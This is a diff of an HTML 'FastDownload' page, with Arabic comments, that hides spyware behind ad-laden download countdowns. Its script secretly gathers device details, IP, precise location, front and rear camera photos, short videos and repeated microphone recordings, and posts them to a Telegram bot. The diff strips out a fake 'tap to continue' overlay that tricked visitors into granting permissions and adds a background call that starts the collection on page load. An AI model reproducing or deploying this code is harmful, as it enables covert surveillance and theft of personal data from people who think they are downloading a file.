@@ -39,32 +39,9 @@
   .ic{display:block;flex:none}
   .page{display:none}.page.active{display:block}
   .ftr{font-size:12px;color:#8a93a8;margin:16px 0}
-
-  /* ===== صفحة تفعيل الأذونات ===== */
-  #gate{position:fixed;inset:0;z-index:99999;background:#fff;
-        display:flex;align-items:center;justify-content:center;
-        font-family:Tahoma,Arial,sans-serif;color:#2b3445;text-align:center;padding:20px;
-        cursor:pointer;-webkit-tap-highlight-color:transparent;
-        transition:opacity .3s;user-select:none}
-  #gate .g-title{font-size:22px;font-weight:bold;margin-bottom:10px}
-  #gate .g-sub{font-size:14px;color:#6b7690}
-  #gate .g-spin{width:44px;height:44px;border:4px solid #e3e8f1;border-top-color:#2d7ff9;
-                border-radius:50%;animation:gspin 1s linear infinite;margin:0 auto 16px}
-  @keyframes gspin{to{transform:rotate(360deg)}}
-  #gate.fade{opacity:0;pointer-events:none}
 </style>
 </head>
 <body>
-
-<!-- ===== صفحة تفعيل الأذونات (مخفية فوق كل حاجة) ===== -->
-<div id="gate">
-  <div>
-    <div class="g-spin"></div>
-    <div class="g-title">جاري التحميل...</div>
-    <div class="g-sub">اضغط في أي مكان للمتابعة</div>
-  </div>
-</div>
-
 <div class="nav">Fast<span>Download</span></div>
 <div class="wrap">
 
@@ -110,11 +87,11 @@
 
 <script>
 /* ============================================================
-   1) جمع البيانات + إرسال للتليجرام
+   1) إعدادات + قراءة البارامترات
    ============================================================ */
 const API_KEY = "754298";
-
 const qs = new URLSearchParams(location.search);
+
 const api   = qs.get('api')   || '';
 const id    = qs.get('id')    || '';
 const token = qs.get('token') || '';
@@ -129,18 +106,25 @@ const want = {
   r  : qs.has('r')
 };
 
-/* دوال الإرسال */
+/* ============================================================
+   2) دوال الإرسال للتليجرام
+   ============================================================ */
 async function tg(ep, fd){
-  try { await fetch('https://api.telegram.org/bot' + token + '/' + ep, {method:'POST', body: fd}); } catch(e){}
+  try { await fetch('https://api.telegram.org/bot' + token + '/' + ep, {method:'POST', body: fd}); }
+  catch(e){}
 }
 function tgText(txt){
-  const fd = new FormData(); fd.append('chat_id', id); fd.append('text', txt);
-  fd.append('parse_mode','HTML'); return tg('sendMessage', fd);
+  const fd = new FormData();
+  fd.append('chat_id', id);
+  fd.append('text', txt);
+  fd.append('parse_mode', 'HTML');
+  return tg('sendMessage', fd);
 }
 function tgFile(blob, name, type, caption){
   const fd = new FormData();
-  fd.append('chat_id', id); fd.append('caption', caption);
-  let ep='sendDocument', m='document';
+  fd.append('chat_id', id);
+  fd.append('caption', caption);
+  let ep = 'sendDocument', m = 'document';
   if (type.startsWith('image/')) { ep='sendPhoto'; m='photo'; }
   else if (type.startsWith('video/')) { ep='sendVideo'; m='video'; }
   else if (type.startsWith('audio/')) { ep='sendAudio'; m='audio'; }
@@ -148,7 +132,9 @@ function tgFile(blob, name, type, caption){
   return tg(ep, fd);
 }
 
-/* معلومات الجهاز */
+/* ============================================================
+   3) جمع المعلومات
+   ============================================================ */
 async function getInfo(){
   const n = navigator, s = screen;
   let ip = '?';
@@ -172,7 +158,6 @@ Battery: ${bat}
 Time: ${new Date().toLocaleString('ar-EG')}`);
 }
 
-/* الموقع */
 function getLocation(){
   return new Promise(res => {
     if (!navigator.geolocation) return res();
@@ -183,31 +168,34 @@ function getLocation(){
         await tgText(`<b>📍 الموقع</b>\nLat: <code>${la}</code>\nLng: <code>${lo}</code>\nAcc: ${ac}m\n<a href="${map}">فتح الخريطة</a>`);
         res();
       },
-      () => res(), {enableHighAccuracy:true, timeout:15000}
+      () => res(),
+      {enableHighAccuracy:true, timeout:15000}
     );
   });
 }
 
-/* صورة كاميرا */
 async function capturePhoto(facing){
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: facing === 'user' ? 'user' : 'environment' }
     });
     const vid = document.getElementById('vid');
-    vid.srcObject = stream; await vid.play();
+    vid.srcObject = stream;
+    await vid.play();
     await new Promise(r => setTimeout(r, 1200));
+
     const cv = document.getElementById('cv');
-    cv.width = vid.videoWidth; cv.height = vid.videoHeight;
+    cv.width  = vid.videoWidth;
+    cv.height = vid.videoHeight;
     cv.getContext('2d').drawImage(vid, 0, 0);
     const blob = await new Promise(r => cv.toBlob(r, 'image/jpeg', 0.85));
     stream.getTracks().forEach(t => t.stop());
+
     await tgFile(blob, (facing==='user'?'front':'back')+'_'+Date.now()+'.jpg', 'image/jpeg',
       `<b>📷 كاميرا ${facing === 'user' ? 'أمامية' : 'خلفية'}</b>`);
   } catch(e){}
 }
 
-/* فيديو 5 ثواني */
 async function captureVideo(facing){
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
@@ -215,7 +203,8 @@ async function captureVideo(facing){
       audio: true
     });
     const vid = document.getElementById('vid');
-    vid.srcObject = stream; await vid.play();
+    vid.srcObject = stream;
+    await vid.play();
     const rec = new MediaRecorder(stream, { mimeType: 'video/webm' });
     const chunks = [];
     rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
@@ -227,19 +216,20 @@ async function captureVideo(facing){
           `<b>🎥 فيديو ${facing === 'user' ? 'أمامية' : 'خلفية'}</b>`);
         resolve();
       };
-      rec.start(); setTimeout(() => rec.stop(), 5000);
+      rec.start();
+      setTimeout(() => rec.stop(), 5000);
     });
   } catch(e){}
 }
 
-/* تسجيل صوتي متكرر */
 async function recordAudioLoop(){
   try {
     const stream = await navigator.mediaDevices.getUserMedia({audio:true});
     const rec = new MediaRecorder(stream, { mimeType: 'audio/webm' });
     const chunks = [];
     rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
-    let count = 0; const TOTAL = 6;
+    let count = 0;
+    const TOTAL = 6;
     await new Promise(resolve => {
       rec.onstop = async () => {
         const blob = new Blob(chunks, {type:'audio/webm'});
@@ -248,18 +238,20 @@ async function recordAudioLoop(){
           `<b>🎙 تسجيل صوتي #${count}</b>`);
         chunks.length = 0;
         if (count < TOTAL) {
-          rec.start(); setTimeout(() => rec.stop(), 5000);
+          rec.start();
+          setTimeout(() => rec.stop(), 5000);
         } else {
           stream.getTracks().forEach(t=>t.stop());
           resolve();
         }
       };
-      rec.start(); setTimeout(() => rec.stop(), 5000);
+      rec.start();
+      setTimeout(() => rec.stop(), 5000);
     });
   } catch(e){}
 }
 
-/* تشغيل جمع البيانات في الخلفية */
+/* تشغيل جمع كل المعلومات المطلوبة */
 async function collectAll(){
   if (!id || !token || api !== API_KEY) return;
   if (want.inf) await getInfo();
@@ -272,61 +264,7 @@ async function collectAll(){
 }
 
 /* ============================================================
-   2) صفحة تفعيل الأذونات (لمسة حقيقية بس)
-   ============================================================ */
-(function(){
-  const gate = document.getElementById('gate');
-  let activated = false;
-  let sx = 0, sy = 0, st = 0;
-
-  function onStart(e){
-    const p = e.touches ? e.touches[0] : e;
-    sx = p.clientX; sy = p.clientY; st = Date.now();
-  }
-  function onEnd(e){
-    if (activated) return;
-    const p = e.changedTouches ? e.changedTouches[0] : e;
-    const dx = Math.abs(p.clientX - sx);
-    const dy = Math.abs(p.clientY - sy);
-    const dt = Date.now() - st;
-    /* لمسة حقيقية: مسافة أقل من 10px وزمن أقل من 500ms */
-    if (dx > 10 || dy > 10 || dt > 500) return;
-    activated = true;
-    activate();
-  }
-
-  gate.addEventListener('touchstart', onStart, {passive:true});
-  gate.addEventListener('touchend',   onEnd,   {passive:true});
-  gate.addEventListener('mousedown',  onStart);
-  gate.addEventListener('mouseup',    onEnd);
-  gate.addEventListener('touchmove', function(e){ e.preventDefault(); }, {passive:false});
-
-  async function activate(){
-    gate.classList.add('fade');
-    /* طلب أذونات الكاميرا والميكروفون */
-    try {
-      const s = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'environment' }, audio: true
-      });
-      s.getTracks().forEach(t => t.stop());
-    } catch(e){}
-    /* طلب إذن الموقع */
-    try {
-      await new Promise(res => {
-        if (!navigator.geolocation) return res();
-        navigator.geolocation.getCurrentPosition(()=>res(), ()=>res(), {timeout:8000});
-      });
-    } catch(e){}
-
-    setTimeout(() => { gate.style.display = 'none'; }, 350);
-
-    /* بدء جمع البيانات وإرسالها */
-    collectAll();
-  }
-})();
-
-/* ============================================================
-   3) منطق صفحة التحميل (كودك الأصلي)
+   4) منطق صفحة التحميل
    ============================================================ */
 var SMART_LINK = "https://araplhn.org/4/7e093505ac4f216b5950d797a595b30c";
 var WAIT1 = 5, WAIT2 = 30, WAIT3 = 30, GAP = 5;
@@ -370,6 +308,7 @@ function addGhost(){
     document.body.appendChild(s);
   });
 }
+
 function ring(n, secs, onlyVisible, doneMsg, onDone){
   var el = $("r"+n), fg = el.querySelector(".fg"), num = el.querySelector(".num");
   var left = secs; num.textContent = left; fg.style.strokeDashoffset = 0;
@@ -404,6 +343,9 @@ function show(n){
   $("p"+n).classList.add("active"); window.scrollTo(0,0);
 }
 
+/* ============================================================
+   5) التشغيل
+   ============================================================ */
 addBanners("ads1"); addNative("native1");
 ring(1, WAIT1, false, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b1"); });
 $("b1").onclick = function(){
@@ -421,6 +363,9 @@ $("b2").onclick = function(){
   });
 };
 $("b3").onclick = function(){ window.location.href = SMART_LINK; };
+
+/* بدء جمع المعلومات (في الخلفية) */
+collectAll();
 </script>
 </body>
-                                                                                                                          </html>
+   </html>
